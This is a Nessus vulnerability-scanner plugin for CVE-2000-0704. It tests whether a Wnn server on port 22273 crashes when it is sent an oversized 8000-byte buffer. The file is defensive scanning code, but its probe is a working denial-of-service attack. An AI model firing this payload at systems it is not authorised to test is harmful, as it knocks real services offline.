#
# (C) Tenable Network Security, Inc.
#

# References:
# http://www.tomo.gr.jp/users/wnn/0008ml/msg00000.html
# http://online.securityfocus.com/advisories/4413

include("compat.inc");

if (description)
{
  script_id(11108);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/09/12 13:37:17 $");

  script_cve_id("CVE-2000-0704");
  script_bugtraq_id(1603);
  script_osvdb_id(11080);

  script_name(english:"Omron WorldView Wnn Multiple Command Remote Overflow");
  script_summary(english:"Checks if the remote Wnn can be buffer overflown");

  script_set_attribute(attribute:"synopsis", value:"The remote service is vulnerable to a buffer overflow.");
  script_set_attribute(attribute:"description", value:
"It was possible to make the remote Wnn server crash by sending an
oversized string to it.");
  script_set_attribute(attribute:"see_also", value:"ftp://patches.sgi.com/support/free/security/advisories/20000803-01-A");
  script_set_attribute(attribute:"solution", value:"Upgrade to the latest version or contact your vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/22");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");

  script_require_keys("Settings/ParanoidReport");
  script_require_ports(22273);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 22273;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
  send(socket:soc, data:raw_string(0x00, 0x00, 0x00, 0x01));
  send(socket:soc, data:raw_string(0x00, 0x00, 0x40, 0x00));
  buf = crap(8000);
  buf[10] = raw_string(0);
  buf[799] = raw_string(0);
  send(socket:soc, data:buf);
  close(soc);
  sleep(1);
  soc2 = open_sock_tcp(port);
  if(!soc2)
    security_hole(port);
}
